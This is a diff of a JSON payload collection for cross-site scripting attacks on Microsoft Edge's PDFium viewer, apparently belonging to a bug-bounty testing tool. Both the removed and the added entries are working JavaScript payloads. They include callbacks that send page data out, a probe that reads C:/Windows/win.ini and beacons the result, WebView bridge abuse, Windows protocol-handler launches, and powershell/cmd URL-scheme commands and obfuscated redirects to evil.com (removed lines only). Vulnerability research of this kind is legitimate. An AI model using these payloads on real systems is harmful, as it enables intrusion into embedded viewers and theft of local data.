@@ -1,230 +1,338 @@
 {
   "metadata": {
     "browser": "edge",
-    "name": "Microsoft Edge PDF Exploits",
-    "description": "Microsoft Edge PDF viewer specific XSS payloads targeting Windows integration and WebView exploitation",
-    "total_payloads": 22,
-    "categories": [
-      "windows_integration",
+    "name": "Edge PDFium Research Payloads",
+    "renderer": "PDFium",
+    "browser_priority": "primary",
+    "description": "Curated Edge/PDFium payloads centered on WebView bridge proof, viewer-boundary checks, blind callback validation, and explicit Windows handler research.",
+    "supported_research_tiers": [
+      "validation",
+      "aggressive"
+    ],
+    "validation_focus_categories": [
       "webview_exploit",
-      "registry_manipulation",
       "file_system"
     ],
+    "aggressive_focus_categories": [
+      "windows_integration"
+    ],
+    "sbx_focus": [
+      "WebView bridge and parent-window proof paths",
+      "controlled callback validation for embedded and admin previews",
+      "local resource reachability after viewer-context confirmation",
+      "Windows native-handler research separated behind aggressive filtering"
+    ],
+    "recommended_profiles": [
+      "high-signal",
+      "blind-oast",
+      "bridge-probes",
+      "sbx",
+      "upload-preview",
+      "aggressive-research"
+    ],
+    "preferred_delivery_paths": [
+      "inline_preview",
+      "admin_review",
+      "embedded_webview",
+      "embedded_viewer"
+    ],
+    "research_highlights": [
+      "Start with chrome.webview, external.notify, and parent-frame proof because these are the most reusable Edge host-bridge checks.",
+      "Use blind callbacks to confirm downstream preview execution before touching Windows handlers.",
+      "Keep ms-settings and search-ms payloads explicit and aggressive so the default workflow stays validation-first."
+    ],
+    "host_context": "embedded_edge_pdfium_viewer",
+    "evidence_level": "medium",
+    "recommended_validation_payloads": [
+      "edge_webview_postmessage",
+      "edge_external_notify_bridge",
+      "edge_blind_fetch_post",
+      "edge_file_local_probe"
+    ],
+    "recommended_aggressive_payloads": [
+      "edge_handler_ms_settings",
+      "edge_handler_search_ms"
+    ],
+    "default_payload_metadata": {
+      "trigger": "document_open",
+      "preconditions": [
+        "JavaScript execution in the embedded Edge PDF viewer or host WebView"
+      ],
+      "requires_user_gesture": "no",
+      "expected_signal": "host_bridge_or_postmessage_activity",
+      "bug_bounty_value": "high",
+      "stability": "medium",
+      "delivery_paths": [
+        "inline_preview",
+        "admin_review",
+        "embedded_webview",
+        "embedded_viewer"
+      ]
+    },
+    "total_payloads": 9,
+    "categories": [
+      "file_system",
+      "webview_exploit",
+      "windows_integration"
+    ],
     "cve_references": [
-      "CVE-2019-0676",
-      "CVE-2020-0878",
       "CVE-2021-31199",
-      "CVE-2022-21907"
+      "CVE-2023-36792",
+      "CVE-2023-4863",
+      "CVE-2024-0519"
     ]
   },
   "payloads": [
     {
-      "id": "edge_001",
+      "id": "edge_webview_postmessage",
       "category": "webview_exploit",
-      "technique": "webview_postmessage",
-      "payload": "window.chrome.webview.postMessage('{url}');",
-      "description": "Edge PDF WebView postMessage exploitation",
+      "browser": "edge",
+      "technique": "chrome_webview_postmessage",
+      "payload": "(function(){try{if(window.chrome&&window.chrome.webview&&window.chrome.webview.postMessage){window.chrome.webview.postMessage({source:'pdfium',probe:'edge-webview-postmessage',href:String(location.href),target:'{url}'});}}catch(e){}})();",
+      "description": "Primary WebView bridge proof for embedded Edge/PDFium renderers used in desktop wrappers and internal review tools.",
       "risk_level": "high",
-      "browser": "edge"
+      "research_tier": "validation",
+      "stability": "high",
+      "expected_signal": "host_bridge_or_postmessage_activity",
+      "bug_bounty_value": "high",
+      "method_family": "bridge_probe",
+      "boundary_target": "viewer_to_host_bridge",
+      "blind_channels": [
+        "webview_bridge"
+      ],
+      "validation_stage": "boundary_validation",
+      "signal_strength": "high",
+      "delivery_paths": [
+        "admin_review",
+        "embedded_webview",
+        "embedded_viewer"
+      ],
+      "preconditions": [
+        "Host application exposes chrome.webview.postMessage to the PDF renderer"
+      ],
+      "evidence_level": "medium"
     },
     {
-      "id": "edge_002",
+      "id": "edge_external_notify_bridge",
       "category": "webview_exploit",
-      "technique": "external_notify",
-      "payload": "window.external.notify('{url}');",
-      "description": "Edge PDF external notify method for data exfiltration",
+      "browser": "edge",
+      "technique": "external_notify_bridge",
+      "payload": "(function(){try{if(window.external&&typeof window.external.notify==='function'){window.external.notify(JSON.stringify({source:'pdfium',probe:'edge-external-notify',href:String(location.href),target:'{url}'}));}}catch(e){}})();",
+      "description": "Legacy host-bridge proof for WebView-backed or IE-compatibility integration paths still exposed around Edge PDF previews.",
       "risk_level": "medium",
-      "browser": "edge"
+      "research_tier": "validation",
+      "stability": "medium",
+      "expected_signal": "host_bridge_or_postmessage_activity",
+      "bug_bounty_value": "high",
+      "method_family": "bridge_probe",
+      "boundary_target": "viewer_to_host_bridge",
+      "blind_channels": [
+        "external_notify"
+      ],
+      "validation_stage": "boundary_validation",
+      "signal_strength": "high",
+      "delivery_paths": [
+        "admin_review",
+        "embedded_webview",
+        "embedded_viewer"
+      ],
+      "preconditions": [
+        "Host application exposes window.external.notify to the renderer"
+      ],
+      "evidence_level": "medium"
     },
     {
-      "id": "edge_003",
-      "category": "windows_integration",
-      "technique": "settings_privacy_access",
-      "payload": "app.launchURL('ms-settings:privacy-webcam?url={url}', true);",
-      "description": "Edge PDF Windows Settings privacy access with parameter injection",
+      "id": "edge_boundary_parent_postmessage",
+      "category": "webview_exploit",
+      "browser": "edge",
+      "technique": "parent_postmessage_boundary",
+      "payload": "(function(){try{if(window.parent&&window.parent!==window&&window.parent.postMessage){window.parent.postMessage({source:'pdfium',probe:'edge-parent-postmessage',href:String(location.href)},'*');}}catch(e){}})();",
+      "description": "Embedded-preview boundary check for Edge PDFium when the viewer is framed inside an internal workflow.",
       "risk_level": "medium",
-      "browser": "edge"
+      "research_tier": "validation",
+      "stability": "high",
+      "expected_signal": "postmessage_activity",
+      "bug_bounty_value": "high",
+      "method_family": "bridge_probe",
+      "boundary_target": "viewer_to_parent",
+      "blind_channels": [
+        "postmessage"
+      ],
+      "validation_stage": "boundary_validation",
+      "signal_strength": "high",
+      "delivery_paths": [
+        "inline_preview",
+        "admin_review",
+        "embedded_viewer"
+      ],
+      "preconditions": [
+        "PDF is rendered inside a parent frame that listens to message events"
+      ],
+      "evidence_level": "medium"
     },
     {
-      "id": "edge_004",
-      "category": "windows_integration",
-      "technique": "available_networks",
-      "payload": "app.launchURL('ms-availablenetworks:?target={url}', true);",
-      "description": "Edge PDF Windows available networks access with URL injection",
-      "risk_level": "medium",
-      "browser": "edge"
-    },
-    {
-      "id": "edge_005",
-      "category": "windows_integration",
-      "technique": "power_settings",
-      "payload": "app.launchURL('ms-settings-power:?exploit={url}', true);",
-      "description": "Edge PDF Windows power settings access with parameter injection",
-      "risk_level": "low",
-      "browser": "edge"
-    },
-    {
-      "id": "edge_006",
-      "category": "windows_integration",
-      "technique": "apps_folder_access",
-      "payload": "app.launchURL('shell:AppsFolder?url={url}', true);",
-      "description": "Edge PDF Windows Apps folder access with URL parameter",
-      "risk_level": "medium",
-      "browser": "edge"
-    },
-    {
-      "id": "edge_007",
-      "category": "registry_manipulation",
-      "technique": "registry_edge_access",
-      "payload": "app.launchURL('regedit://HKEY_CURRENT_USER/Software/Microsoft/Edge?url={url}', true);",
-      "description": "Edge PDF Windows Registry access attempt with URL injection",
+      "id": "edge_boundary_top_nav",
+      "category": "webview_exploit",
+      "browser": "edge",
+      "technique": "top_navigation_boundary",
+      "payload": "(function(){var base='{url}';var sep=base.indexOf('?')===-1?'?':'&';try{if(window.top&&window.top!==window){window.top.location=base+sep+'probe=edge-top-nav';}}catch(e){}})();",
+      "description": "Top-frame boundary probe for Edge PDF previews embedded in portals, admin consoles, or WebView shells.",
       "risk_level": "high",
-      "browser": "edge"
+      "research_tier": "validation",
+      "stability": "medium",
+      "expected_signal": "controlled_navigation_callback",
+      "bug_bounty_value": "high",
+      "method_family": "viewer_boundary_probe",
+      "boundary_target": "viewer_to_parent",
+      "blind_channels": [
+        "navigation"
+      ],
+      "validation_stage": "boundary_validation",
+      "signal_strength": "high",
+      "delivery_paths": [
+        "inline_preview",
+        "admin_review",
+        "embedded_webview",
+        "embedded_viewer"
+      ],
+      "evidence_level": "medium"
     },
     {
-      "id": "edge_008",
-      "category": "windows_integration",
-      "technique": "powershell_execution",
-      "payload": "app.launchURL('powershell://Invoke-WebRequest -Uri {url}', true);",
-      "description": "Edge PDF PowerShell execution via URL scheme",
-      "risk_level": "critical",
-      "browser": "edge"
-    },
-    {
-      "id": "edge_009",
-      "category": "windows_integration",
-      "technique": "cmd_execution",
-      "payload": "app.launchURL('cmd://curl {url}', true);",
-      "description": "Edge PDF command prompt execution via URL scheme",
-      "risk_level": "critical",
-      "browser": "edge"
-    },
-    {
-      "id": "edge_010",
-      "category": "windows_integration",
-      "technique": "windows_store_apps",
-      "payload": "app.launchURL('ms-windows-store://pdp/?ProductId=exploit&url={url}', true);",
-      "description": "Edge PDF Windows Store app access with URL parameter injection",
+      "id": "edge_blind_image_beacon",
+      "category": "webview_exploit",
+      "browser": "edge",
+      "technique": "image_beacon_callback",
+      "payload": "(function(){var base='{url}';var sep=base.indexOf('?')===-1?'?':'&';(new Image()).src=base+sep+'probe=edge-image-beacon&href='+encodeURIComponent(String(location.href));})();",
+      "description": "Low-noise blind callback for embedded Edge viewers when bridge APIs are absent or not observable.",
       "risk_level": "medium",
-      "browser": "edge"
+      "research_tier": "validation",
+      "stability": "high",
+      "expected_signal": "controlled_callback",
+      "bug_bounty_value": "high",
+      "method_family": "blind_callback",
+      "boundary_target": "render_path_validation",
+      "blind_channels": [
+        "http"
+      ],
+      "validation_stage": "blind_validation",
+      "signal_strength": "high",
+      "delivery_paths": [
+        "inline_preview",
+        "admin_review",
+        "embedded_webview",
+        "embedded_viewer"
+      ],
+      "evidence_level": "medium"
     },
     {
-      "id": "edge_011",
+      "id": "edge_blind_fetch_post",
+      "category": "webview_exploit",
+      "browser": "edge",
+      "technique": "fetch_post_callback",
+      "payload": "(function(){var base='{url}';var sep=base.indexOf('?')===-1?'?':'&';try{fetch(base+sep+'probe=edge-fetch-post',{method:'POST',mode:'no-cors',body:JSON.stringify({href:String(location.href),origin:String(location.origin||'null')})});}catch(e){}})();",
+      "description": "Blind-OAST-friendly POST callback for preview paths where the renderer runs but parent or host bridge access is uncertain.",
+      "risk_level": "medium",
+      "research_tier": "validation",
+      "stability": "high",
+      "expected_signal": "controlled_callback",
+      "bug_bounty_value": "high",
+      "method_family": "blind_callback",
+      "boundary_target": "render_path_validation",
+      "blind_channels": [
+        "http"
+      ],
+      "validation_stage": "blind_validation",
+      "signal_strength": "high",
+      "delivery_paths": [
+        "inline_preview",
+        "admin_review",
+        "embedded_webview",
+        "embedded_viewer"
+      ],
+      "evidence_level": "medium"
+    },
+    {
+      "id": "edge_file_local_probe",
       "category": "file_system",
-      "technique": "calculator_execution",
-      "payload": "app.launchURL('file:///C:/Windows/System32/calc.exe?url={url}', true);",
-      "description": "Edge PDF Windows Calculator execution with parameter injection",
-      "risk_level": "high",
-      "browser": "edge"
-    },
-    {
-      "id": "edge_012",
-      "category": "file_system",
-      "technique": "public_documents_access",
-      "payload": "app.launchURL('file:///C:/Users/Public/Documents/?target={url}', true);",
-      "description": "Edge PDF Windows Public Documents access with URL parameter",
+      "browser": "edge",
+      "technique": "local_file_fetch_probe",
+      "payload": "(function(){var base='{url}';var sep=base.indexOf('?')===-1?'?':'&';fetch('file:///C:/Windows/win.ini').then(function(r){return r.text().then(function(t){navigator.sendBeacon(base+sep+'probe=edge-file-fetch',JSON.stringify({status:r.status,length:t.length}));});}).catch(function(){(new Image()).src=base+sep+'probe=edge-file-fetch-blocked';});})();",
+      "description": "Local Windows resource reachability check with callback proof, intended only after viewer execution is confirmed.",
       "risk_level": "medium",
-      "browser": "edge"
+      "research_tier": "validation",
+      "stability": "medium",
+      "expected_signal": "local_resource_probe",
+      "bug_bounty_value": "medium",
+      "method_family": "local_resource_probe",
+      "boundary_target": "viewer_to_local_resource",
+      "blind_channels": [
+        "http"
+      ],
+      "validation_stage": "blind_validation",
+      "signal_strength": "high",
+      "delivery_paths": [
+        "admin_review",
+        "embedded_webview",
+        "embedded_viewer"
+      ],
+      "preconditions": [
+        "Renderer is allowed to attempt local Windows file fetches"
+      ],
+      "evidence_level": "medium"
     },
     {
-      "id": "edge_013",
-      "category": "advanced_evasion",
+      "id": "edge_handler_ms_settings",
+      "category": "windows_integration",
       "browser": "edge",
-      "technique": "edge_chromium_import_maps_2024",
-      "payload": "try{if('importMap'in HTMLScriptElement.prototype){const script=document.createElement('script');script.type='importmap';script.textContent=JSON.stringify({'imports':{'exploit':'data:application/javascript,Function(\\'parent.location=\"https://evil.com/collect\"\\')()'}});document.head.appendChild(script);import('exploit');}else{throw new Error('Import maps not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Edge Chromium import maps bypass using ES6 module import",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-4863"
+      "technique": "external_handler_ms_settings",
+      "payload": "(function(){try{location='ms-settings:privacy-webcam';}catch(e){}})();",
+      "description": "Aggressive Windows settings handler research kept out of the default validation path.",
+      "risk_level": "critical",
+      "research_tier": "aggressive",
+      "stability": "experimental",
+      "expected_signal": "external_handler_launch",
+      "bug_bounty_value": "medium",
+      "method_family": "external_handler_probe",
+      "boundary_target": "viewer_to_external_handler",
+      "blind_channels": [
+        "navigation"
+      ],
+      "validation_stage": "aggressive_research",
+      "signal_strength": "research",
+      "delivery_paths": [
+        "admin_review",
+        "embedded_webview",
+        "embedded_viewer"
+      ],
+      "requires_user_gesture": "possible",
+      "evidence_level": "low"
     },
     {
-      "id": "edge_014",
-      "category": "advanced_evasion",
+      "id": "edge_handler_search_ms",
+      "category": "windows_integration",
       "browser": "edge",
-      "technique": "edge_webassembly_streaming_2024",
-      "payload": "try{if('compileStreaming'in WebAssembly){const wasmCode=new Uint8Array([0,97,115,109,1,0,0,0]);const response=new Response(wasmCode,{headers:{'Content-Type':'application/wasm'}});WebAssembly.compileStreaming(response).then(module=>Function('parent.location=\"https://evil.com/collect\"')());}else{throw new Error('WebAssembly streaming not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Edge WebAssembly streaming bypass using compile streaming API",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-5218"
-    },
-    {
-      "id": "edge_015",
-      "category": "advanced_evasion",
-      "browser": "edge",
-      "technique": "edge_webcodecs_bypass_2024",
-      "payload": "try{if('VideoDecoder'in window){const decoder=new VideoDecoder({output:frame=>{frame.close();Function('parent.location=\"https://evil.com/collect\"')();},error:err=>eval('parent.window.location=\"https://evil.com/collect\"')});decoder.configure({codec:'vp8'});}else{throw new Error('WebCodecs not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Edge WebCodecs bypass using video decoder API trigger",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-4863"
-    },
-    {
-      "id": "edge_016",
-      "category": "advanced_evasion",
-      "browser": "edge",
-      "technique": "edge_storage_foundation_bypass_2024",
-      "payload": "try{if('storageFoundation'in navigator){navigator.storageFoundation.open('test').then(storage=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Storage Foundation not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Edge Storage Foundation bypass using native file system access",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-5218"
-    },
-    {
-      "id": "edge_017",
-      "category": "advanced_evasion",
-      "browser": "edge",
-      "technique": "edge_digital_goods_bypass_2024",
-      "payload": "try{if('getDigitalGoodsService'in window){window.getDigitalGoodsService('https://play.google.com/billing').then(service=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Digital Goods not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Edge Digital Goods API bypass using payment service integration",
-      "risk_level": "low",
-      "cve_reference": "CVE-2023-4863"
-    },
-    {
-      "id": "edge_018",
-      "category": "advanced_evasion",
-      "browser": "edge",
-      "technique": "edge_scheduler_postTask_bypass_2024",
-      "payload": "try{if('scheduler'in window&&'postTask'in scheduler){scheduler.postTask(()=>Function('parent.location=\"https://evil.com/collect\"')(),{priority:'user-blocking'});}else{throw new Error('Scheduler not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Edge Scheduler.postTask bypass using task scheduling API",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-5218"
-    },
-    {
-      "id": "edge_019",
-      "category": "advanced_evasion",
-      "browser": "edge",
-      "technique": "edge_bluetooth_bypass_2024",
-      "payload": "try{if('bluetooth'in navigator){navigator.bluetooth.requestDevice({acceptAllDevices:true}).then(device=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Bluetooth not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Edge Bluetooth API bypass using device discovery trigger",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-4863"
-    },
-    {
-      "id": "edge_020",
-      "category": "advanced_evasion",
-      "browser": "edge",
-      "technique": "edge_webrtc_encoded_transform_2024",
-      "payload": "try{if('RTCRtpScriptTransform'in window){const pc=new RTCPeerConnection();pc.addTransceiver('video',{direction:'sendonly'});const sender=pc.getSenders()[0];sender.transform=new RTCRtpScriptTransform('data:application/javascript,Function(\\'parent.location=\"https://evil.com/collect\"\\')()');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Edge WebRTC Encoded Transform bypass using RTP script transform",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-5218"
-    },
-    {
-      "id": "edge_021",
-      "category": "advanced_evasion",
-      "browser": "edge",
-      "technique": "edge_shared_storage_bypass_2024",
-      "payload": "try{if('sharedStorage'in window){window.sharedStorage.worklet.addModule('data:application/javascript,class SharedStorageWorklet{async run(){Function(\\'parent.location=\"https://evil.com/collect\"\\')();}}registerSharedStorageWorklet(\\'test\\',SharedStorageWorklet);');}else{throw new Error('Shared Storage not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Edge Shared Storage bypass using worklet execution context",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-4863"
-    },
-    {
-      "id": "edge_022",
-      "category": "advanced_evasion",
-      "browser": "edge",
-      "technique": "edge_topics_api_bypass_2024",
-      "payload": "try{if('browsingTopics'in document){document.browsingTopics().then(topics=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Topics API not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Edge Topics API bypass using browsing topics privacy API",
-      "risk_level": "low",
-      "cve_reference": "CVE-2023-5218"
+      "technique": "external_handler_search_ms",
+      "payload": "(function(){try{location='search-ms:query=invoice';}catch(e){}})();",
+      "description": "Explicit native-handler research for Windows-backed review paths; only use after validation payloads land.",
+      "risk_level": "critical",
+      "research_tier": "aggressive",
+      "stability": "experimental",
+      "expected_signal": "external_handler_launch",
+      "bug_bounty_value": "medium",
+      "method_family": "external_handler_probe",
+      "boundary_target": "viewer_to_external_handler",
+      "blind_channels": [
+        "navigation"
+      ],
+      "validation_stage": "aggressive_research",
+      "signal_strength": "research",
+      "delivery_paths": [
+        "admin_review",
+        "embedded_webview",
+        "embedded_viewer"
+      ],
+      "requires_user_gesture": "possible",
+      "evidence_level": "low"
     }
   ]
 }
